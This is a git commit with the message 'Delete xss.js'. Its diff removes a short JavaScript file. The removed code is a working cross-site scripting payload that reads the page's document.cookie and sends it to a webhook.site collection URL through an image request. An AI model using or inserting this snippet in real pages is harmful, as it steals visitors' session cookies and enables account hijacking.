58c79846f0ade231e4f46bdcc090621da588fb99
Khang VT <162398503+KangVT@users.noreply.github.com>
2025-08-29 18:38:22 +0700

    Delete xss.js

--- xss.js
+++
@@ -1,6 +0,0 @@
-(function () {
-  const cookie = document.cookie;
-
-  const img = new Image();
-  img.src = "https://webhook.site/46fd811f-10cd-4862-89ed-bd9293055b39?cookie=" + encodeURIComponent(cookie);
-})();
